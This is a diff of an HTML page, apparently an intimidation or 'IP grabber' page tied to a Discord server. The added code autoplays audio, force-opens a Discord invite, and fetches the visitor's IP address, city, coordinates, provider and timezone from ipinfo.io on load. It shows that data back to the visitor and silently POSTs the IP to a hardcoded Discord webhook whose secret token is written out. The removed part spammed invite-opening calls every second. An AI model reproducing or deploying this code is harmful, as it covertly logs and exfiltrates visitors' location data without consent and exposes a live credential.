@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
 
-
 <div class="text"></div>
 
     <meta charset="UTF-8">
@@ -15,7 +14,7 @@
             background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
-            color: #0036FF;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,41 +22,49 @@
             flex-direction: column;
             text-align: center;
         }
-        .image-container img {
-            width: 650px; 
-            height: 1;
-            border: px solid #ffffff; 
-            border-radius: 31px;
-            box-shadow: 0 0 30px rgba(255, 255, 255 ); 
-        }
 
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ffffff; 
-            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
-            letter-spacing: 3.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #ffffff; 
-            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
-            letter-spacing: 3.5px; 
-        }
 
-    </style>
+    #bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .info {
+      font-size: 1.4em;
+      text-shadow: 0 0 8px White, 0 0 15px White, 0 0 25px White;
+      letter-spacing: 2px;
+    }
+
+    .text {
+      font-size: 3em;
+      text-shadow: 0 0 10px White;
+      letter-spacing: 5px;
+      margin-top: 2vh;
+    }
+  </style>
 </head>
 <body>
- <div class="image-container">
-    <img src="" alt="">
-   
-    </div>
-    <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1263875285015859324/1400274852979675231/nooo.mp3?ex=688eae14&is=688d5c94&hm=f4216221449e2766fa931a7a0fcf66245a808c49eabdaefa2c4a5d93293cbcff&" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+
+
+<script>
+  function openNewTab() {
+    window.open('https://discord.gg/erzhHvmNSH', '_blank');
+  }
+openNewTab();
+</script>
+
+
+  <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
+  <audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1361773811955007729/1361773889251967017/Falcon_Rp.mp4?ex=6890ff43&is=688fadc3&hm=153a0b902f69de158ef357f441bb5fd7235cf1351e723b2040cc3ffe5dc1d608&" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
     <div class="info" id="ip-info">
         <strong>IP: <span id="ip"></span></strong><br>
         <span><strong>City:</strong> <span id="city"></span></span><br>
@@ -67,28 +74,60 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
- <div class="text">discord.gg/erzhHvmNSH</div>
 
-<script>   
-        setisnterval(function() {
-            window.invokeNative("openUrl", "https://discord.gg/x25FWvRngB");
-            window.invokeNative("openUrl", "https://discord.gg/x25FWvRngB");
-            window.invokeNative("openUrl", "https://discord.gg/x25FWvRngB");
-            window.invokeNative("openUrl", "https://discord.gg/x25FWvRngB");
-          }, 1000);
+  <!-- Footer Text -->
+  <div class="text">discord.gg/erzhHvmNSH
+  
 
-    </script>
 
-    <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1401402084624044032/SAhbEAqKtHeaXxs1HJR3aHmQGwhlw5hes8HEWE9kxkAn3R2IgYE9W1iF7dqZbGJPFgrP";
+
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip').textContent = ip;
+        const payload = {
+          content: ` New Visitor IP: \`${ip}\``
+        };
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        }).then(res => {
+          console.log("IP sent to Discord.");
+        }).catch(err => {
+          console.error("Failed to send to Discord:", err);
         });
-    </script>
 
+      })
+      .catch(error => {
+        document.getElementById('ip').textContent = "Failed to load IP.";
+        console.error("IP fetch error:", error);
+      });
+  </script>
+</body>
+</html>
+
+
+  <!-- IP Lookup Script -->
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").textContent = data.ip;
+        document.getElementById("city").textContent = data.city;
+        document.getElementById("region").textContent = data.region;
+        document.getElementById("country").textContent = data.country;
+        document.getElementById("loc").textContent = data.loc;
+        document.getElementById("org").textContent = data.org;
+        document.getElementById("timezone").textContent = data.timezone;
+      });
+  </script>
 
 </body>
 </html>
